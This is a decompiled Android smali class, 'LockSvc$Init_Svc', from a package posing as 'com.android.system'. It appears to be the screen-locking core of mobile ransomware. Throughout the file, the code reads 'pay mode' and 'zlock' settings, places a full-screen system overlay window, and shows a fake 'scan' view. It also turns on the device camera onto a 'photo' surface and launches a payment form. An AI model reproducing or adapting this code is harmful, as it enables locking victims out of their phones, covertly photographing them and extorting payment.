.class public Lcom/android/system/LockSvc$Init_Svc;
.super Landroid/os/AsyncTask;
.source "LockSvc.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/android/system/LockSvc;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = "Init_Svc"
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask",
        "<",
        "Landroid/content/Context;",
        "Ljava/lang/Void;",
        "Ljava/lang/String;",
        ">;"
    }
.end annotation


# instance fields
.field final synthetic this$0:Lcom/android/system/LockSvc;


# direct methods
.method public constructor <init>(Lcom/android/system/LockSvc;)V
    .locals 0

    .prologue
    .line 788
    iput-object p1, p0, Lcom/android/system/LockSvc$Init_Svc;->this$0:Lcom/android/system/LockSvc;

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    return-void
.end method

.method static synthetic access$2(Lcom/android/system/LockSvc$Init_Svc;)Lcom/android/system/LockSvc;
    .locals 1

    .prologue
    .line 788
    iget-object v0, p0, Lcom/android/system/LockSvc$Init_Svc;->this$0:Lcom/android/system/LockSvc;

    return-object v0
.end method


# virtual methods
.method protected bridge varargs synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1

    .prologue
    .line 1
    check-cast p1, [Landroid/content/Context;

    invoke-virtual {p0, p1}, Lcom/android/system/LockSvc$Init_Svc;->doInBackground([Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method protected varargs doInBackground([Landroid/content/Context;)Ljava/lang/String;
    .locals 10
    .param p1, "arg0"    # [Landroid/content/Context;

    .prologue
    const/4 v5, 0x0

    const/4 v1, -0x1

    .line 792
    new-instance v2, Lcom/android/system/IO;

    invoke-direct {v2}, Lcom/android/system/IO;-><init>()V

    const-string v3, "reb"

    aget-object v4, p1, v5

    invoke-virtual {v2, v3, v4}, Lcom/android/system/IO;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v7

    .line 793
    .local v7, "PayMode":Ljava/lang/String;
    new-instance v2, Lcom/android/system/IO;

    invoke-direct {v2}, Lcom/android/system/IO;-><init>()V

    const-string v3, "zlock"

    aget-object v4, p1, v5

    invoke-virtual {v2, v3, v4}, Lcom/android/system/IO;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v9

    .line 794
    .local v9, "ZLock":Ljava/lang/String;
    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    .line 796
    const/16 v3, 0x7da

    .line 797
    const/16 v4, 0x400

    .line 798
    const/4 v5, -0x3

    move v2, v1

    .line 794
    invoke-direct/range {v0 .. v5}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    .line 799
    .local v0, "Param":Landroid/view/WindowManager$LayoutParams;
    const/16 v1, 0x583

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->flags:I

    .line 803
    iget-object v1, p0, Lcom/android/system/LockSvc$Init_Svc;->this$0:Lcom/android/system/LockSvc;

    const-string v2, "window"

    invoke-virtual {v1, v2}, Lcom/android/system/LockSvc;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/view/WindowManager;

    .line 804
    .local v8, "Wm":Landroid/view/WindowManager;
    iget-object v1, p0, Lcom/android/system/LockSvc$Init_Svc;->this$0:Lcom/android/system/LockSvc;

    const-string v2, "layout_inflater"

    invoke-virtual {v1, v2}, Lcom/android/system/LockSvc;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/view/LayoutInflater;

    .line 806
    .local v6, "Inf":Landroid/view/LayoutInflater;
    iget-object v1, p0, Lcom/android/system/LockSvc$Init_Svc;->this$0:Lcom/android/system/LockSvc;

    iput-object v0, v1, Lcom/android/system/LockSvc;->Params:Landroid/view/WindowManager$LayoutParams;

    .line 807
    iget-object v1, p0, Lcom/android/system/LockSvc$Init_Svc;->this$0:Lcom/android/system/LockSvc;

    iput-object v8, v1, Lcom/android/system/LockSvc;->WM:Landroid/view/WindowManager;

    .line 808
    iget-object v1, p0, Lcom/android/system/LockSvc$Init_Svc;->this$0:Lcom/android/system/LockSvc;

    iput-object v6, v1, Lcom/android/system/LockSvc;->INF:Landroid/view/LayoutInflater;

    .line 810
    const-string v1, "true"

    invoke-virtual {v7, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_0

    const-string v1, "stop"

    invoke-virtual {v9, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_0

    .line 811
    const-string v1, "scan"

    .line 817
    :goto_0
    return-object v1

    :cond_0
    const/4 v1, 0x0

    goto :goto_0
.end method

.method public bridge synthetic onPostExecute(Ljava/lang/Object;)V
    .locals 0

    .prologue
    .line 1
    check-cast p1, Ljava/lang/String;

    invoke-virtual {p0, p1}, Lcom/android/system/LockSvc$Init_Svc;->onPostExecute(Ljava/lang/String;)V

    return-void
.end method

.method public onPostExecute(Ljava/lang/String;)V
    .locals 9
    .param p1, "A"    # Ljava/lang/String;

    .prologue
    const/4 v8, 0x0

    .line 821
    invoke-super {p0, p1}, Landroid/os/AsyncTask;->onPostExecute(Ljava/lang/Object;)V

    .line 823
    const-string v0, "scan"

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 824
    iget-object v0, p0, Lcom/android/system/LockSvc$Init_Svc;->this$0:Lcom/android/system/LockSvc;

    iget-object v0, v0, Lcom/android/system/LockSvc;->INF:Landroid/view/LayoutInflater;

    const v1, 0x7f030004

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v6

    .line 825
    .local v6, "Scan":Landroid/view/View;
    iget-object v0, p0, Lcom/android/system/LockSvc$Init_Svc;->this$0:Lcom/android/system/LockSvc;

    iput-object v6, v0, Lcom/android/system/LockSvc;->VW:Landroid/view/View;

    .line 827
    iget-object v0, p0, Lcom/android/system/LockSvc$Init_Svc;->this$0:Lcom/android/system/LockSvc;

    iget-object v0, v0, Lcom/android/system/LockSvc;->WM:Landroid/view/WindowManager;

    iget-object v1, p0, Lcom/android/system/LockSvc$Init_Svc;->this$0:Lcom/android/system/LockSvc;

    iget-object v1, v1, Lcom/android/system/LockSvc;->Params:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v0, v6, v1}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 832
    new-instance v0, Lcom/android/system/LockSvc$Scan;

    iget-object v1, p0, Lcom/android/system/LockSvc$Init_Svc;->this$0:Lcom/android/system/LockSvc;

    invoke-direct {v0, v1}, Lcom/android/system/LockSvc$Scan;-><init>(Lcom/android/system/LockSvc;)V

    new-array v1, v8, [Ljava/lang/Void;

    invoke-virtual {v0, v1}, Lcom/android/system/LockSvc$Scan;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 833
    iget-object v0, p0, Lcom/android/system/LockSvc$Init_Svc;->this$0:Lcom/android/system/LockSvc;

    iget-object v1, p0, Lcom/android/system/LockSvc$Init_Svc;->this$0:Lcom/android/system/LockSvc;

    invoke-static {v1}, Lcom/android/system/LockSvc;->access$5(Lcom/android/system/LockSvc;)Landroid/hardware/Camera;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/android/system/LockSvc;->access$6(Lcom/android/system/LockSvc;Landroid/hardware/Camera;)V

    .line 835
    iget-object v0, p0, Lcom/android/system/LockSvc$Init_Svc;->this$0:Lcom/android/system/LockSvc;

    invoke-static {v0}, Lcom/android/system/LockSvc;->access$0(Lcom/android/system/LockSvc;)Landroid/hardware/Camera;

    move-result-object v0

    if-eqz v0, :cond_0

    .line 837
    new-instance v0, Lcom/android/system/LockSvc$Init_Svc$1;

    const-wide/16 v2, 0x1388

    const-wide/16 v4, 0x1387

    move-object v1, p0

    invoke-direct/range {v0 .. v5}, Lcom/android/system/LockSvc$Init_Svc$1;-><init>(Lcom/android/system/LockSvc$Init_Svc;JJ)V

    .line 852
    invoke-virtual {v0}, Lcom/android/system/LockSvc$Init_Svc$1;->start()Landroid/os/CountDownTimer;

    .line 854
    iget-object v1, p0, Lcom/android/system/LockSvc$Init_Svc;->this$0:Lcom/android/system/LockSvc;

    iget-object v0, p0, Lcom/android/system/LockSvc$Init_Svc;->this$0:Lcom/android/system/LockSvc;

    iget-object v0, v0, Lcom/android/system/LockSvc;->VW:Landroid/view/View;

    .line 855
    iget-object v2, p0, Lcom/android/system/LockSvc$Init_Svc;->this$0:Lcom/android/system/LockSvc;

    invoke-virtual {v2}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v2

    const-string v3, "photo"

    const-string v4, "id"

    iget-object v5, p0, Lcom/android/system/LockSvc$Init_Svc;->this$0:Lcom/android/system/LockSvc;

    invoke-virtual {v5}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v3, v4, v5}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v2

    invoke-virtual {v0, v2}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/LinearLayout;

    .line 854
    invoke-static {v1, v0}, Lcom/android/system/LockSvc;->access$7(Lcom/android/system/LockSvc;Landroid/widget/LinearLayout;)V

    .line 856
    iget-object v0, p0, Lcom/android/system/LockSvc$Init_Svc;->this$0:Lcom/android/system/LockSvc;

    invoke-static {v0}, Lcom/android/system/LockSvc;->access$3(Lcom/android/system/LockSvc;)Landroid/widget/LinearLayout;

    move-result-object v0

    invoke-virtual {v0, v8}, Landroid/widget/LinearLayout;->setEnabled(Z)V

    .line 857
    iget-object v0, p0, Lcom/android/system/LockSvc$Init_Svc;->this$0:Lcom/android/system/LockSvc;

    iget-object v0, v0, Lcom/android/system/LockSvc;->VW:Landroid/view/View;

    .line 858
    iget-object v1, p0, Lcom/android/system/LockSvc$Init_Svc;->this$0:Lcom/android/system/LockSvc;

    invoke-virtual {v1}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v1

    const-string v2, "photoz"

    const-string v3, "id"

    iget-object v4, p0, Lcom/android/system/LockSvc$Init_Svc;->this$0:Lcom/android/system/LockSvc;

    invoke-virtual {v4}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v2, v3, v4}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v1

    invoke-virtual {v0, v1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v7

    .line 857
    check-cast v7, Landroid/view/SurfaceView;

    .line 859
    .local v7, "surfaceView":Landroid/view/SurfaceView;
    iget-object v0, p0, Lcom/android/system/LockSvc$Init_Svc;->this$0:Lcom/android/system/LockSvc;

    invoke-virtual {v7}, Landroid/view/SurfaceView;->getHolder()Landroid/view/SurfaceHolder;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/android/system/LockSvc;->access$8(Lcom/android/system/LockSvc;Landroid/view/SurfaceHolder;)V

    .line 860
    iget-object v0, p0, Lcom/android/system/LockSvc$Init_Svc;->this$0:Lcom/android/system/LockSvc;

    invoke-static {v0}, Lcom/android/system/LockSvc;->access$2(Lcom/android/system/LockSvc;)Landroid/view/SurfaceHolder;

    move-result-object v0

    iget-object v1, p0, Lcom/android/system/LockSvc$Init_Svc;->this$0:Lcom/android/system/LockSvc;

    iget-object v1, v1, Lcom/android/system/LockSvc;->mSurfaceHolderCallback:Landroid/view/SurfaceHolder$Callback;

    invoke-interface {v0, v1}, Landroid/view/SurfaceHolder;->addCallback(Landroid/view/SurfaceHolder$Callback;)V

    .line 864
    .end local v6    # "Scan":Landroid/view/View;
    .end local v7    # "surfaceView":Landroid/view/SurfaceView;
    :cond_0
    const-string v0, "pay"

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_1

    .line 865
    new-instance v0, Lcom/android/system/LockSvc$PayForm;

    iget-object v1, p0, Lcom/android/system/LockSvc$Init_Svc;->this$0:Lcom/android/system/LockSvc;

    invoke-direct {v0, v1}, Lcom/android/system/LockSvc$PayForm;-><init>(Lcom/android/system/LockSvc;)V

    new-array v1, v8, [Ljava/lang/Void;

    invoke-virtual {v0, v1}, Lcom/android/system/LockSvc$PayForm;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 868
    :cond_1
    return-void
.end method
